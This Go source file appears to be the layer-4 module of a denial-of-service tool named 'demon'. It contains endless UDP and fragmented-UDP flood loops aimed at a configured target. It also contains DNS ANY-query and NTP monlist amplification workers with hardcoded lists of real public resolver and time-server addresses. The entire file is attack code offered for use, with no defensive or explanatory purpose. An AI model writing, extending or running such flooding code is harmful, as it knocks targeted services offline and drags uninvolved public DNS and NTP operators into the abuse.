package l4

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/0xTM7/demon/internal/config"
	"github.com/0xTM7/demon/internal/utils"
)

var DNSReflectors = []string{
	"8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
	"208.67.222.222", "208.67.220.220",
}

var NTPReflectors = []string{
	"129.6.15.28", "129.6.15.29", "129.6.15.30",
	"132.163.97.1", "132.163.97.2",
}

func BuildDNSQuery(Domain string) []byte {
	Buf := make([]byte, 0, 64)
	ID := make([]byte, 2)
	binary.BigEndian.PutUint16(ID, uint16(rand.Intn(65535)))
	Buf = append(Buf, ID...)
	Buf = append(Buf, 0x01, 0x00)
	Buf = append(Buf, 0x00, 0x01)
	Buf = append(Buf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	for _, Part := range splitDomain(Domain) {
		Buf = append(Buf, byte(len(Part)))
		Buf = append(Buf, []byte(Part)...)
	}
	Buf = append(Buf, 0x00)
	Buf = append(Buf, 0x00, 0xff)
	Buf = append(Buf, 0x00, 0x01)
	return Buf
}

func splitDomain(D string) []string {
	Parts := []string{}
	Start := 0
	for I := 0; I < len(D); I++ {
		if D[I] == '.' {
			Parts = append(Parts, D[Start:I])
			Start = I + 1
		}
	}
	Parts = append(Parts, D[Start:])
	return Parts
}

func BuildNTPMonlist() []byte {
	Pkt := make([]byte, 48)
	Pkt[0] = 0x17
	Pkt[1] = 0x00
	Pkt[2] = 0x03
	Pkt[3] = 0x2a
	return Pkt
}

func RunUDPWorker(Cfg *config.DemonConfig, Stop <-chan struct{}) {
	Addr := fmt.Sprintf("%s:%d", Cfg.IP, Cfg.Port)
	Payload := utils.RandPayload(utils.RandInt(512, 1400))

	for {
		select {
		case <-Stop:
			return
		default:
			Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}
			N, Err := Conn.Write(Payload)
			Conn.Close()
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
			} else {
				Cfg.Stats.Requests.Add(1)
				Cfg.Stats.BytesSent.Add(int64(N))
				Cfg.Stats.Success.Add(1)
			}
		}
	}
}

func RunUDPFragWorker(Cfg *config.DemonConfig, Stop <-chan struct{}) {
	Addr := fmt.Sprintf("%s:%d", Cfg.IP, Cfg.Port)
	FragSize := 512
	TotalSize := utils.RandInt(8192, 65535)

	for {
		select {
		case <-Stop:
			return
		default:
			Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}
			Sent := 0
			for Sent < TotalSize {
				End := Sent + FragSize
				if End > TotalSize {
					End = TotalSize
				}
				Chunk := utils.RandPayload(End - Sent)
				N, _ := Conn.Write(Chunk)
				Cfg.Stats.BytesSent.Add(int64(N))
				Sent = End
			}
			Conn.Close()
			Cfg.Stats.Requests.Add(1)
			Cfg.Stats.Success.Add(1)
		}
	}
}

func RunDNSAmpWorker(Cfg *config.DemonConfig, Stop <-chan struct{}) {
	Domains := []string{"google.com", "cloudflare.com", "amazon.com", "microsoft.com"}

	for {
		select {
		case <-Stop:
			return
		default:
			Reflector := utils.Pick(DNSReflectors)
			Addr := fmt.Sprintf("%s:53", Reflector)
			Query := BuildDNSQuery(utils.Pick(Domains))

			Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}
			N, Err := Conn.Write(Query)
			Conn.Close()
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
			} else {
				Cfg.Stats.Requests.Add(1)
				Cfg.Stats.BytesSent.Add(int64(N))
				Cfg.Stats.Success.Add(1)
			}
		}
	}
}

func RunNTPAmpWorker(Cfg *config.DemonConfig, Stop <-chan struct{}) {
	Pkt := BuildNTPMonlist()

	for {
		select {
		case <-Stop:
			return
		default:
			Reflector := utils.Pick(NTPReflectors)
			Addr := fmt.Sprintf("%s:123", Reflector)

			Conn, Err := net.DialTimeout("udp", Addr, 3*time.Second)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}
			N, Err := Conn.Write(Pkt)
			Conn.Close()
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
			} else {
				Cfg.Stats.Requests.Add(1)
				Cfg.Stats.BytesSent.Add(int64(N))
				Cfg.Stats.Success.Add(1)
			}
		}
	}
}
